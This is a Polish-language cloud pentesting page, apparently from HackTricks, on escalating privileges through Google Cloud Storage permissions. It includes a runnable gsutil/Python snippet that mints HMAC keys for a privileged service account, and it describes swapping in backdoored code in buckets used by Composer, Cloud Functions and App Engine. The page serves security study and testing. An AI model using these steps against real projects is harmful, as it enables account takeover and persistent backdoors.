# GCP - Storage Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Storage

Podstawowe informacje:

{{#ref}}
../gcp-services/gcp-storage-enum.md
{{#endref}}

### `storage.objects.get`

To uprawnienie pozwala na **pobieranie plików przechowywanych w Cloud Storage**. To potencjalnie pozwoli na eskalację uprawnień, ponieważ w niektórych przypadkach **wrażliwe informacje są tam przechowywane**. Ponadto, niektóre usługi GCP przechowują swoje informacje w bucketach:

- **GCP Composer**: Gdy tworzysz środowisko Composer, **kod wszystkich DAG-ów** będzie zapisany w **buckecie**. Te zadania mogą zawierać interesujące informacje w swoim kodzie.
- **GCR (Container Registry)**: **Obraz** kontenerów jest przechowywany w **bucketach**, co oznacza, że jeśli możesz czytać buckety, będziesz mógł pobierać obrazy i **szukać wycieków i/lub kodu źródłowego**.

### `storage.objects.setIamPolicy`

Możesz dać sobie uprawnienie do **wykorzystania dowolnego z wcześniejszych scenariuszy tej sekcji**.

### **`storage.buckets.setIamPolicy`**

Aby zobaczyć przykład, jak zmodyfikować uprawnienia za pomocą tego uprawnienia, sprawdź tę stronę:

{{#ref}}
../gcp-unauthenticated-enum-and-access/gcp-storage-unauthenticated-enum/gcp-public-buckets-privilege-escalation.md
{{#endref}}

### `storage.hmacKeys.create`

Funkcja "interoperacyjności" Cloud Storage, zaprojektowana do **interakcji między chmurami** jak z AWS S3, obejmuje **tworzenie kluczy HMAC dla kont serwisowych i użytkowników**. Atakujący może to wykorzystać, **generując klucz HMAC dla konta serwisowego z podwyższonymi uprawnieniami**, co pozwala na **eskalację uprawnień w Cloud Storage**. Chociaż klucze HMAC powiązane z użytkownikami można odzyskać tylko za pośrednictwem konsoli internetowej, zarówno klucze dostępu, jak i sekrety pozostają **wiecznie dostępne**, co pozwala na potencjalny dostęp do przechowywania kopii zapasowych. Z drugiej strony, klucze HMAC powiązane z kontem serwisowym są dostępne przez API, ale ich klucze dostępu i sekrety nie są dostępne po utworzeniu, co dodaje warstwę złożoności dla ciągłego dostępu.
```bash
# Create key
gsutil hmac create <sa-email> # You might need to execute this inside a VM instance

## If you have TROUBLES creating the HMAC key this was you can also do it contacting the API directly:
PROJECT_ID = '$PROJECT_ID'
TARGET_SERVICE_ACCOUNT = f"exam-storage-sa-read-flag-3@{PROJECT_ID}.iam.gserviceaccount.com"
ACCESS_TOKEN = "$CLOUDSDK_AUTH_ACCESS_TOKEN"
import requests
import json
key = requests.post(
f'https://www.googleapis.com/storage/v1/projects/{PROJECT_ID}/hmacKeys',
params={'access_token': ACCESS_TOKEN, 'serviceAccountEmail': TARGET_SERVICE_ACCOUNT}
).json()
#print(json.dumps(key, indent=4))
print(f'ID: {key["metadata"]["accessId"]}')
print(f'Secret: {key["secret"]}')


# Configure gsutil to use the HMAC key
gcloud config set pass_credentials_to_gsutil false
gsutil config -a

# Use it
gsutil ls gs://[BUCKET_NAME]

# Restore
gcloud config set pass_credentials_to_gsutil true
```
Inny skrypt exploitacyjny dla tej metody można znaleźć [tutaj](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/storage.hmacKeys.create.py).

## `storage.objects.create`, `storage.objects.delete` = Uprawnienia do zapisu w Storage

Aby **utworzyć nowy obiekt** w obrębie bucketu, potrzebujesz `storage.objects.create`, a zgodnie z [dokumentacją](https://cloud.google.com/storage/docs/access-control/iam-permissions#object_permissions), potrzebujesz również `storage.objects.delete`, aby **zmodyfikować** istniejący obiekt.

Bardzo **częstym sposobem wykorzystania** bucketów, w których można pisać w chmurze, jest sytuacja, gdy **bucket przechowuje pliki serwera WWW**, możesz być w stanie **przechować nowy kod**, który będzie używany przez aplikację internetową.

### Composer

**Composer** to **Apache Airflow** zarządzany w GCP. Ma kilka interesujących funkcji:

- Działa w obrębie **klastra GKE**, więc **SA, którego używa klaster, jest dostępny** dla kodu działającego w Composer
- Wszystkie komponenty środowisk composera (**kod DAG-ów**, wtyczki i dane) są przechowywane w bucketcie GCP. Jeśli atakujący ma uprawnienia do odczytu i zapisu, może monitorować bucket i **za każdym razem, gdy DAG jest tworzony lub aktualizowany, przesłać wersję z backdoorem**, aby środowisko composera pobrało z storage wersję z backdoorem.

**Możesz znaleźć PoC tego ataku w repozytorium:** [**https://github.com/carlospolop/Monitor-Backdoor-Composer-DAGs**](https://github.com/carlospolop/Monitor-Backdoor-Composer-DAGs)

### Cloud Functions

- Kod Cloud Functions jest przechowywany w Storage, a gdy tworzona jest nowa wersja, kod jest przesyłany do bucketu, a następnie nowy kontener jest budowany z tego kodu. Dlatego **nadpisanie kodu przed zbudowaniem nowej wersji umożliwia wykonanie dowolnego kodu przez funkcję chmurową**.

**Możesz znaleźć PoC tego ataku w repozytorium:** [**https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions**](https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions)

### App Engine

Wersje AppEngine generują pewne dane w obrębie bucketu w formacie nazwy: `staging.<project-id>.appspot.com`. W tym bucketcie można znaleźć folder o nazwie `ae`, który będzie zawierał folder dla każdej wersji aplikacji AppEngine, a wewnątrz tych folderów będzie można znaleźć plik `manifest.json`. Plik ten zawiera json z wszystkimi plikami, które muszą być użyte do utworzenia konkretnej wersji. Ponadto można znaleźć **prawdziwe nazwy plików, URL do nich w obrębie bucketu GCP (pliki w bucketcie zmieniły swoją nazwę na ich sha1 hash) oraz sha1 hash każdego pliku.**

_Należy zauważyć, że nie jest możliwe wcześniejsze przejęcie tego bucketu, ponieważ użytkownicy GCP nie są uprawnieni do generowania bucketów przy użyciu nazwy domeny appspot.com._

Jednakże, mając dostęp do odczytu i zapisu w tym bucketcie, można eskalować uprawnienia do SA przypisanego do wersji App Engine, monitorując bucket i za każdym razem, gdy dokonana zostanie zmiana (nowa wersja), jak najszybciej modyfikując nową wersję. W ten sposób kontener, który zostanie utworzony z tego kodu, wykona kod z backdoorem.

Wspomniany atak można przeprowadzić na wiele różnych sposobów, wszystkie zaczynają się od monitorowania bucketu `staging.<project-id>.appspot.com`:

- Prześlij kompletny nowy kod wersji AppEngine do innego dostępnego bucketu i przygotuj **plik `manifest.json` z nową nazwą bucketu i sha1 hashami**. Następnie, gdy nowa wersja zostanie utworzona w obrębie bucketu, wystarczy zmodyfikować plik `manifest.json` i przesłać złośliwy.
- Prześlij zmodyfikowaną wersję `requirements.txt`, która będzie używać **złośliwego kodu zależności i zaktualizuj plik `manifest.json`** z nową nazwą pliku, URL i jego hashem.
- Prześlij **zmodyfikowany plik `main.py` lub `app.yaml`, który wykona złośliwy kod** i zaktualizuj plik `manifest.json` z nową nazwą pliku, URL i jego hashem.

**Możesz znaleźć PoC tego ataku w repozytorium:** [**https://github.com/carlospolop/Monitor-Backdoor-AppEngine**](https://github.com/carlospolop/Monitor-Backdoor-AppEngine)

### GCR

- **Google Container Registry** przechowuje obrazy w bucketach, jeśli możesz **zapisywać w tych bucketach**, możesz być w stanie **przesunąć się lateralnie do miejsca, w którym te buckety są uruchamiane.**
- Bucket używany przez GCR będzie miał URL podobny do `gs://<eu/usa/asia/nothing>.artifacts.<project>.appspot.com` (Najwyższe subdomeny są określone [tutaj](https://cloud.google.com/container-registry/docs/pushing-and-pulling)).

> [!TIP]
> Ta usługa jest przestarzała, więc ten atak nie jest już użyteczny. Ponadto, Artifact Registry, usługa, która zastępuje tę, nie przechowuje obrazów w bucketach.

## **Referencje**

- [https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/#:\~:text=apiKeys.-,create,privileges%20than%20our%20own%20user.](https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/)

{{#include ../../../banners/hacktricks-training.md}}
